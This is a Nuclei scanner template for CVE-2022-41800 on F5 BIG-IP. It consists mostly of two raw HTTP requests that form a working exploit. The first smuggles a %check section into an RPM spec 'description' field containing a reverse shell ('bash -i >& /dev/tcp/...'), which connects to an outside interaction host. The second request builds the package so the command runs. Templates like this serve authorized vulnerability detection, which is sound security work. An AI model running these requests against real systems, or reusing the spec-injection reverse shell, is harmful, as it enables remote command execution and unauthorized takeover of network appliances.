id: CVE-2022-41800

info:
  name: F5 BIG-IP iControl RPC - REST Appliance RCE
  author: dwisiswant0
  severity: critical
  description: |
    When running in Appliance mode, an authenticated user assigned the Administrator role may
    be able to bypass Appliance mode restrictions, utilizing an undisclosed iControl REST endpoint.
    A successful exploit can allow the attacker to execute remote commands on server using
    authorization bypass (CVE-2022-1388).
  reference:
    - https://attackerkb.com/topics/ZClTQn4aG4/cve-2022-41800/rapid7-analysis
    - https://support.f5.com/csp/article/K97843387
    - https://support.f5.com/csp/article/K13325942
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41800
  metadata:
    shodan-query: http.title:"BIG-IP&reg;-+Redirect" +"Server"
    verified: "true"
  tags: f5,bigip,cve,cve2022,rce

variables:
  auth: "admin:"
  rand_app: "{{to_lower(rand_text_alpha(6))}}"

requests:
  - raw:
      - |
        POST /mgmt/shared/iapp/rpm-spec-creator HTTP/1.1
        Host: {{Hostname}}
        X-F5-Auth-Token: a
        Authorization: Basic {{base64(auth)}}
        Content-Type: application/json
        Connection: keep-alive, X-F5-Auth-Token

        {
          "specFileData": {
            "name": "{{rand_app}}",
            "srcBasePath": "/tmp",
            "version": "{{concat(rand_app, rand_text_numeric(1))}}",
            "release": "{{concat(rand_app, rand_text_numeric(1))}}",
            "description": "{{concat(rand_app, rand_text_numeric(1))}}\n\n%check\nbash -i >& /dev/tcp/{{interactsh-url}}/{{rand_text_numeric(4)}} 0>&1",
            "summary": "{{concat(rand_app, rand_text_numeric(1))}}"
          }
        }

      - |
        POST /mgmt/shared/iapp/build-package HTTP/1.1
        Host: {{Hostname}}
        X-F5-Auth-Token: a
        Authorization: Basic {{base64(auth)}}
        Content-Type: application/json
        Connection: keep-alive, X-F5-Auth-Token

        {
          "state": {},
          "appName": "{{rand_app}}",
          "packageDirectory": "/tmp",
          "specFilePath": "{{spec}}",
          "force": true
        }

    extractors:
      - type: json
        part: body
        name: spec
        json:
          - ".specFilePath"
        internal: true

    # matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      # # If needed, (?) is it necessary to check the response if
      # # the build of iApp doesn't trigger interactsh protocol or
      # # run the RPM spec description command.
      # - type: word
      #   part: body
      #   words:
      #     - "RUN_BUILD_RPM_TASK"
      #     - "buildrpmtaskstate"